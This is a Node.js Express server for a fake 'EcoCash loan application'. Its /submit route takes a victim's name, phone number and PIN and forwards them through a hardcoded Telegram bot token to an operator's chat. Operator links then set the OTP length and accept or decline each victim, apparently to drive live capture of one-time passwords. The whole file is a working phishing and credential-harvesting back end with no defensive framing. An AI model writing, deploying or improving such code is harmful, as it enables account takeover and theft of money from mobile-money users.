const express = require("express");
const path = require("path");
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

const app = express();

let otpLength = null;
let decision = null; // accept or decline

app.use(express.json());

// serve static files
app.use(express.static(path.join(__dirname, "public")));

// ==============================
// TELEGRAM CONFIG (PUT YOURS)
// ==============================
const TELEGRAM_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const CHAT_ID = "7162306402";

// ==============================
// TELEGRAM FUNCTION
// ==============================
async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
    }),
  });

  const data = await response.json();
  console.log("TELEGRAM RESPONSE:", data);

  if (!data.ok) {
    throw new Error("Telegram failed");
  }
}

app.post("/submit", async (req, res) => {
  try {
    const { name, phone, pin } = req.body;

    const message = `
📥 NEW LOAN APPLICATION

👤 Name: ${name}
📞 Phone: ${phone}
🔐 PIN: ${pin}

⚙️ ADMIN CONTROL:

OTP 5 → https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp5
OTP 6 → https://ecocash-loan-app.onrender.com/telegram-command?cmd=otp6

✅ ACCEPT → https://ecocash-loan-app.onrender.com/telegram-command?cmd=accept
❌ DECLINE → https://ecocash-loan-app.onrender.com/telegram-command?cmd=decline

🔄 RESET → https://ecocash-loan-app.onrender.com/telegram-command?cmd=reset
`;
console.log("SENDING MESSAGE:", message);

    await sendToTelegram(message);

    res.json({ success: true });

  } catch (err) {
    console.error("ERROR:", err.message);
    res.json({ success: false });
  }
});

// ==============================
// TELEGRAM ADMIN CONTROL
// ==============================
app.get("/telegram-command", (req, res) => {
  const cmd = req.query.cmd;

  if (cmd === "otp5") {
    otpLength = 5;
    console.log("✅ OTP set to 5 from Telegram");
  }

  if (cmd === "otp6") {
    otpLength = 6;
    console.log("✅ OTP set to 6 from Telegram");
  }

  if (cmd === "accept") {
    decision = "accept";
    console.log("✅ USER ACCEPTED");
  }

  if (cmd === "decline") {
    decision = "decline";
    console.log("❌ USER DECLINED");
  }

  if (cmd === "reset") {
    otpLength = null;
    decision = null;
    console.log("🔄 Reset all");
  }

  res.send("OK");
});
// ==============================
// ROOT ROUTE
// ==============================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/set-otp", (req, res) => {
  const { otp } = req.body;

  if (otp !== 5 && otp !== 6) {
    return res.json({ success: false, message: "Only 5 or 6 allowed" });
  }

  otpLength = otp;

  console.log("✅ OTP SET TO:", otpLength);

  res.json({ success: true });
});

app.get("/otp-status", (req, res) => {
  const currentOtp = otpLength;

  // RESET AFTER READ (IMPORTANT)
  otpLength = null;

  res.json({ otp: currentOtp });
});

app.get("/decision-status", (req, res) => {
  const currentDecision = decision;

  // RESET AFTER READ
  decision = null;

  res.json({ decision: currentDecision });
});

// ==============================
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Server running on ${PORT}`);
});